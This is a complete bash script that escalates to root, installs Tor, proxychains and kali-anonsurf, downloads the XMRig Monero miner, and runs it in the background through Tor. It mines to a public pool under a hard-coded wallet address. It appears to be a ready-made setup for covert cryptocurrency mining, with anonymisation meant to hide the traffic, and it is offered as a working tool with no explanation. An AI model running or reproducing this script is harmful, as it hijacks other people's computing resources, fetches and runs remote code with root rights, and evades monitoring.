#!/bin/bash
sudo -i
sudo apt-get -y update
sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev uuid-dev tor proxychains tar wget
wget https://github.com/xmrig/xmrig/releases/download/v5.11.2/xmrig-5.11.2-xenial-x64.tar.gz
git clone https://github.com/Und3rf10w/kali-anonsurf
cd kali-anonsurf
./installer.sh
anonsurf start
cd
tar --extract --file xmrig-5.11.2-xenial-x64.tar.gz
sudo sysctl -w vm.nr_hugepages=128
cd xmrig-5.11.2
proxychains torify ./xmrig --no-color --donate-level 1 --cpu-priority 5 -o pool.supportxmr.com:9000 -u 4AHnjgotTyL79cjhd2kXzb6tuYFUThRJ5J9PRwh7qfgdbeNTDVdpJiK5taWCpR38eWCHFJdmRPZX55YQ5yYg4MTqGzZL2rF -p x2 -a cn/r -x 9150 -t 4 -k --tls -B --background
